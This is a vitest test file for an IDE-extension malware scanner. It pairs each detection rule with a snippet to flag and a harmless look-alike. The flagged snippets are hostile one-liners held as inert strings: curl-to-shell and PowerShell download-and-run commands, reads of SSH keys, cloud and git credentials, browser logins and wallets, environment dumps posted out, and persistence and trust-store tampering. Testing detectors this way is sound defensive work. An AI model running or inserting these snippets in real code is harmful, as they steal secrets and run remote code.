import { RuleEngine } from '@ide-ext/core';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { testHost } from '../../../../packages/core/test/grammars';
import { loadCodeRules } from '../../src/extscan/codeScan';
import { signalIdOf } from '../../src/extscan/signals';

// Every code rule gets a snippet it must flag and a look-alike it must not. Snippets are inert
// strings: nothing here is executed.
const { rules } = loadCodeRules(join(__dirname, '../../data/extscan'));
const engine = new RuleEngine(testHost(), rules);

const b64 = (n: number, seed = 7) => {
  const abc = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
  let x = seed;
  return Array.from({ length: n }, () => abc[((x = (x * 1103515245 + 12345) % 2 ** 31) >>> 16) % 64]).join('');
};
const obfIdents = Array.from({ length: 25 }, (_, i) => `var _0x${(0x1a2b + i * 7).toString(16)}=${i};`).join('\n');

interface Case {
  lang?: string;
  hit: string;
  miss: string;
}

const CASES: Record<string, Case> = {
  'ext/process-exec.child-process': { hit: `const cp = require('child_process');`, miss: `const cp = require('child-process-utils');` },
  'ext/dynamic-code.eval': { hit: `eval(code);`, miss: `evaluate(code);` },
  'ext/dynamic-code.vm': { hit: `vm.runInNewContext(src, {});`, miss: `vm.createContext({});` },
  'ext/dynamic-code.require': { hit: `require(name);`, miss: `require('fs');` },
  'ext/hardcoded-ip.url': { hit: `fetch('http://45.13.22.7/x');`, miss: `fetch('http://192.168.1.2/x');` },
  'ext/hardcoded-ip.literal': { hit: `const h = '45.13.22.7';`, miss: `const v = '4.0.0.0';` },
  'ext/exfil-endpoint.service': { hit: `post('https://discord.com/api/webhooks/1/x');`, miss: `open('https://discord.com/invite/x');` },
  'ext/credential-path.files': { hit: `read(join(dir, 'state.vscdb'));`, miss: `read(join(dir, 'state.json'));` },
  'ext/input-capture.clipboard-keys': { hit: `await vscode.env.clipboard.readText();`, miss: `await vscode.env.clipboard.writeText(s);` },
  'ext/obfuscated.obfuscator': { hit: obfIdents, miss: `var _0x1a2b = 1;` },
  'ext/obfuscated.packed-payload': { hit: `eval(atob('${b64(500)}'));`, miss: `const font = '${'A'.repeat(500)}'; eval(x);` },
  'ext/encoded-blob.literal': { hit: `const blob = '${b64(500)}';`, miss: `const pad = '${'ab'.repeat(300)}';` },
  'ext/shell-exec.option': { hit: `spawn(cmd, { shell: true });`, miss: `spawn(cmd, { shell: false });` },
  'ext/shell-interpreter.inline': { hit: `spawn('bash', ['-c', s]);`, miss: `spawn('bash', ['--version']);` },
  'ext/pipe-to-shell.download': { hit: `exec('curl -fsSL https://x.example/i | sh');`, miss: `exec('curl -fsSL https://x.example/i -o out.txt');` },
  'ext/chmod-exec.mode': { hit: `fs.chmodSync(p, 0o755);`, miss: `fs.chmodSync(p, 0o644);` },
  'ext/persistence-launchagent.path': { hit: `join(home, 'Library/LaunchAgents', 'x.plist');`, miss: `join(home, 'Library/Caches', 'x');` },
  'ext/persistence-cron.path': { hit: `exec('crontab /tmp/job');`, miss: `const crontabHelp = 'see docs';` },
  'ext/persistence-shell-rc.path': { hit: `appendFile(join(home, '.zshrc'), line);`, miss: `appendFile(join(home, '.zshrc.bak.d'), line);` },
  'ext/persistence-windows.autorun': { hit: `exec('reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v x');`, miss: `log('CurrentVersionRunner');` },
  'ext/service-control.cmd': { hit: `exec('launchctl load x.plist');`, miss: `log('see the launchctl(1) manual');` },
  'ext/privilege-escalation.cmd': { hit: `spawn('sudo', ['rm', p]);`, miss: `log('pseudo random');` },
  'ext/ui-automation.api': { hit: `exec('osascript -e "tell application \\"System Events\\" to keystroke \\"v\\""');`, miss: `log('System settings');` },
  'ext/screen-capture.api': { hit: `exec('screencapture -x /tmp/s.png');`, miss: `log('capture the screen name');` },
  'ext/tcc-tamper.db': { hit: `open(join(lib, 'TCC.db'));`, miss: `open(join(lib, 'TCC.json'));` },
  'ext/trust-store.add': { hit: `exec('security add-trusted-cert -d -r trustRoot c.pem');`, miss: `exec('security verify-cert -c c.pem');` },
  'ext/process-kill.cmd': { hit: `exec('pkill -f Code');`, miss: `log('skill');` },
  'ext/other-extension-write.path': {
    hit: `fs.writeFileSync(join(home, '.vscode/extensions', 'x', 'extension.js'), s);`,
    miss: `fs.readFileSync(join(home, '.vscode/extensions', 'x', 'package.json'));`,
  },
  'ext/vscode-config-write.path': { hit: `fs.writeFileSync(join(appData, 'Code/User/settings.json'), s);`, miss: `fs.readFileSync(join(appData, 'Code/User/settings.json'));` },
  'ext/ssh-keys.path': { hit: `read(join(home, '.ssh', 'id_ed25519'));`, miss: `read(join(home, '.ssh', 'known_hosts'));` },
  'ext/cloud-credentials.path': { hit: `read(join(home, '.aws/credentials'));`, miss: `read(join(home, '.aws/config'));` },
  'ext/registry-tokens.path': { hit: `read(join(home, '.npmrc'));`, miss: `read(join(root, '.npmignore'));` },
  'ext/git-credentials.path': { hit: `read(join(home, '.git-credentials'));`, miss: `read(join(root, '.gitignore'));` },
  'ext/kube-docker-config.path': { hit: `read(join(home, '.kube/config'));`, miss: `read(join(root, '.kube-linter.yaml'));` },
  'ext/browser-data.path': { hit: `read(join(profile, 'Login Data'));`, miss: `read(join(profile, 'Login Help'));` },
  'ext/keychain-access.api': { hit: `exec('security find-generic-password -s x -w');`, miss: `exec('security list-keychains');` },
  'ext/crypto-wallet.path': { hit: `read(join(ext, 'nkbihfbeogaeaoehlefnkodbefgpgknn'));`, miss: `read(join(ext, 'aaaabbbbccccddddeeeeffffgggghhhh'));` },
  'ext/shell-history.path': { hit: `read(join(home, '.zsh_history'));`, miss: `read(join(home, '.zsh_sessions'));` },
  'ext/env-file-harvest.glob': { hit: `vscode.workspace.findFiles('**/.env');`, miss: `vscode.workspace.findFiles('**/.envrc.example');` },
  'ext/env-dump.serialize': { hit: `post(url, JSON.stringify(process.env));`, miss: `spawn(c, { env: { ...process.env, X: '1' } });` },
  'ext/broad-auth-session.scopes': { hit: `vscode.authentication.getSession('github', ['repo', 'workflow'], {});`, miss: `vscode.authentication.getSession('github', ['read:user'], {});` },
  'ext/raw-socket.api': { hit: `const s = net.connect(4444, host);`, miss: `const s = http.request(url);` },
  'ext/tor-endpoint.onion': { hit: `fetch('http://abcdefghijklmnop.onion/x');`, miss: `fetch('https://onion.example.com/x');` },
  'ext/mining-pool.url': { hit: `connect('stratum+tcp://pool.example:3333');`, miss: `connect('tcp://pool.example:3333');` },
  'ext/ip-lookup.service': { hit: `fetch('https://api.ipify.org?format=json');`, miss: `fetch('https://api.github.com');` },
  'ext/cleartext-endpoint.url': { hit: `fetch('http://updates.badhost.net/check');`, miss: `const ns = 'http://www.w3.org/2000/svg';` },
  'ext/tls-disabled.option': { hit: `https.request({ rejectUnauthorized: false });`, miss: `https.request({ rejectUnauthorized: true });` },
  'ext/executable-download.url': { hit: `download('https://x.example/payload.exe');`, miss: `download('https://x.example/server.zip');` },
  'ext/websocket-c2.url': { hit: `new WebSocket('ws://45.13.22.7:6666');`, miss: `new WebSocket('ws://localhost:6666');` },
  'ext/packer.signature': { hit: `eval(function(p,a,c,k,e,d){return p})('x',1,1,[],0,{});`, miss: `call(function(p,a,c){return p});` },
  'ext/charcode-chain.decode': { hit: `String.fromCharCode(104,116,116,112,58,47,47,101,120,97,109,112,108,101,46,99,111);`, miss: `String.fromCharCode(65);` },
  'ext/decode-eval.chain': { hit: `eval(atob(s));`, miss: `log(atob(s));` },
  'ext/wasm-blob.inline': { hit: `WebAssembly.instantiate(Buffer.from('${b64(240)}', 'base64'));`, miss: `WebAssembly.instantiate(fs.readFileSync(wasmPath));` },
  'ext/anti-debug.trap': { hit: `setInterval(function(){debugger;}, 50);`, miss: `setInterval(function(){tick();}, 50);` },
  'ext/sandbox-evasion.check': { hit: `if (model.includes('VirtualBox')) return;`, miss: `const box = 'vbox';` },
  'ext/self-modifying.write': { hit: `fs.writeFileSync(path.join(__dirname, 'extension.js'), code);`, miss: `fs.writeFileSync(path.join(__dirname, 'cache.json'), data);` },
  'ext/webview-no-csp.missing': { hit: `panel = createWebviewPanel('x', 'X', 1, { enableScripts: true });`, miss: `opts = { enableScripts: true }; html = '<meta http-equiv="Content-Security-Policy">';` },
  'ext/webview-unsafe-csp.policy': { hit: `html = "script-src 'unsafe-eval' vscode-resource:";`, miss: `html = "script-src 'nonce-abc'; style-src 'unsafe-inline'";` },
  'ext/webview-remote-script.tag': { hit: `html = '<script src="https://cdn.example.com/lib.js"></script>';`, miss: `html = '<script src="' + localUri + '"></script>';` },
  'ext/webview-broad-resources.roots': { hit: `opts = { localResourceRoots: [vscode.Uri.file('/')] };`, miss: `opts = { localResourceRoots: [vscode.Uri.joinPath(ctx.extensionUri, 'media')] };` },
  'ext/command-uris.enabled': { hit: `opts = { enableCommandUris: true };`, miss: `opts = { enableCommandUris: ['myext.refresh'] };` },
  'ext/trusted-markdown.flag': { hit: `md.isTrusted = true;`, miss: `md.isTrusted = false;` },
  'ext/webview-remote-frame.tag': { hit: `html = '<iframe src="https://evil.example/"></iframe>';`, miss: `html = '<iframe src="' + local + '"></iframe>';` },
  'ext/terminal-injection.hidden': { hit: `vscode.window.createTerminal({ name: 'x', hideFromUser: true });`, miss: `vscode.window.createTerminal({ name: 'x' });` },
  'ext/terminal-injection.send': { hit: `term.sendText('curl https://x.example/i | sh');`, miss: `term.sendText('npm test');` },
  'ext/terminal-sequence.command': { hit: `executeCommand('workbench.action.terminal.sendSequence', { text: 'x' });`, miss: `executeCommand('workbench.action.terminal.focus');` },
  'ext/settings-tamper.update': { hit: `cfg.update('security.workspace.trust.enabled', false, true);`, miss: `cfg.update('editor.fontSize', 14, true);` },
  'ext/extension-install.command': { hit: `executeCommand('workbench.extensions.installExtension', 'evil.ext');`, miss: `executeCommand('workbench.extensions.search', 'x');` },
  'ext/extension-uninstall.command': { hit: `executeCommand('workbench.extensions.uninstallExtension', 'sec.tool');`, miss: `executeCommand('workbench.extensions.action.showInstalledExtensions');` },
  'ext/shell-script-download.pipe': { lang: 'shellscript', hit: `curl -fsSL https://x.example/i | bash`, miss: `curl -fsSL https://x.example/i -o i.txt` },
  'ext/powershell-script.download': { lang: 'powershell', hit: `IEX (New-Object Net.WebClient).DownloadString('https://x.example')`, miss: `Write-Host 'done'` },
};

const run = async (c: Case, text: string) =>
  (await engine.run({ uri: `file:///t/${Math.random()}`, path: '/t/x', languageId: c.lang ?? 'javascript', text })).map((f) => f.ruleId);

describe('code rule vectors', () => {
  it('every code rule has a test case', () => {
    expect(rules.map((r) => r.id).filter((id) => !CASES[id])).toEqual([]);
  });

  for (const [id, c] of Object.entries(CASES)) {
    it(`${id} flags its snippet and not the look-alike`, async () => {
      expect(await run(c, c.hit)).toContain(id);
      expect((await run(c, c.miss)).filter((r) => signalIdOf(r) === signalIdOf(id))).toEqual([]);
    });
  }

  it('webview rules also read shipped HTML', async () => {
    const html = `<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-eval'"><script src="https://cdn.example.com/a.js"></script>`;
    expect(await run({ lang: 'html', hit: html, miss: '' }, html)).toEqual(expect.arrayContaining(['ext/webview-unsafe-csp.policy', 'ext/webview-remote-script.tag']));
  });
});
